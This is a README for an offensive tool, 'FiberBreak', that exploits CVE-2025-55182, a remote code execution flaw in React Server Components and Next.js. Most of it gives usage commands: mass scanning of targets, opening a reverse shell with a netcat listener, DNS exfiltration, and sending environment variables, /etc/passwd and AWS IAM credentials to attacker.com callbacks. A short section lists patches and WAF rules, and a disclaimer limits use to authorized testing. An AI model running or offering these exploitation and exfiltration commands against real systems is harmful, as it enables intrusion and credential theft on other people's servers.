# FiberBreak
Exploitation tool for CVE-2025-55182 (React2Shell) - Critical RCE in React Server Components.

## Overview

- **CVE**: CVE-2025-55182
- **CVSS**: 10.0 (CRITICAL)
- **Type**: Remote Code Execution (RCE)
- **Affected**: React 19.0-19.2.0, Next.js 15.x/16.x

## Installation

```bash
pip install -r requirements.txt
chmod +x fiberbreak.py
```

## Usage

### Detection

```bash
# Single target
./fiberbreak.py -u https://target.com detect

# Multiple targets
./fiberbreak.py -l targets.txt detect --threads 20

# Save results
./fiberbreak.py -l targets.txt detect -o results.json
```

### Exploitation

```bash
# Simple command
./fiberbreak.py -u https://target.com exploit -c "whoami"

# Reverse shell
./fiberbreak.py -u https://target.com exploit -c "10.10.10.10:4444" -t reverse_shell

# DNS exfiltration
./fiberbreak.py -u https://target.com exploit -c "whoami:attacker.oastify.com" -t dns_exfil

# Environment dump
./fiberbreak.py -u https://target.com exploit -c "https://attacker.com/exfil" -t env_dump

# File read
./fiberbreak.py -u https://target.com exploit -c "/etc/passwd:https://attacker.com" -t file_read

# AWS metadata
./fiberbreak.py -u https://target.com exploit -c "https://attacker.com/aws" -t aws_metadata

# System recon
./fiberbreak.py -u https://target.com exploit -c "https://attacker.com/recon" -t recon
```

### Impact Assessment

```bash
# Run tests
./fiberbreak.py -u https://target.com assess --callback https://attacker.com

# Save report
./fiberbreak.py -u https://target.com assess --callback https://attacker.com -o report.json
```

## Payload Types

| Type | Format | Description |
|------|--------|-------------|
| `simple` | `command` | Execute any command |
| `reverse_shell` | `lhost:lport` | Bash reverse shell |
| `dns_exfil` | `data:domain` | DNS exfiltration |
| `file_read` | `file:callback` | Read and exfiltrate file |
| `env_dump` | `callback` | Dump environment vars |
| `aws_metadata` | `callback` | AWS IAM credentials |
| `recon` | `callback` | System reconnaissance |
| `stealth_beacon` | `domain` | DNS beacon (no HTTP) |

## Examples

```bash
# DNS beacon - no system impact
./fiberbreak.py -u https://target.com exploit \
  -c "attacker.oastify.com" -t stealth_beacon
```

### Penetration Testing

```bash
# 1. Detect
./fiberbreak.py -u https://target.com detect

# 2. Assess impact
./fiberbreak.py -u https://target.com assess --callback https://callback.com

# 3. Get shell
# Start listener: nc -lvnp 4444
./fiberbreak.py -u https://target.com exploit \
  -c "10.10.10.10:4444" -t reverse_shell
```

### Mass Scanning

```bash
# Create targets.txt
echo "https://app1.target.com" > targets.txt
echo "https://app2.target.com" >> targets.txt

# Scan all
./fiberbreak.py -l targets.txt detect --threads 50 -o scan_results.json

# View vulnerable targets
cat scan_results.json | jq '.[] | select(.vulnerable==true)'
```

## Mitigation

### Patch Immediately

```bash
# React
npm install react@19.1.2 react-dom@19.1.2

# Next.js
npm install next@15.1.6  # or next@16.0.1
```

### WAF Rules

```nginx
# nginx
if ($http_next_action) {
    return 403;
}
```

```apache
# ModSecurity
SecRule REQUEST_HEADERS:Next-Action "@rx ." \
    "id:2025551820,phase:2,deny,status:403"
```

## Technical Details

**Vulnerability**: Unsafe deserialization in React Server Components Flight protocol. The server doesn't validate incoming payloads, allowing attackers to craft malicious Chunk objects that trigger RCE through Function() constructor gadgets.

**Root Cause**: Missing input validation in `decodeReply()` function, allowing arbitrary object injection during promise resolution.

**Attack Vector**: Send crafted multipart/form-data with `Next-Action` header to any RSC endpoint.

## References

- [NVD CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [Wiz Research](https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive)
- [OffSec Analysis](https://www.offsec.com/blog/cve-2025-55182/)

## Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED USE ONLY**

Unauthorized use of this tool is illegal. Only use on systems where you have explicit authorization. The author is not responsible for misuse.

## License

MIT License - Educational purposes only
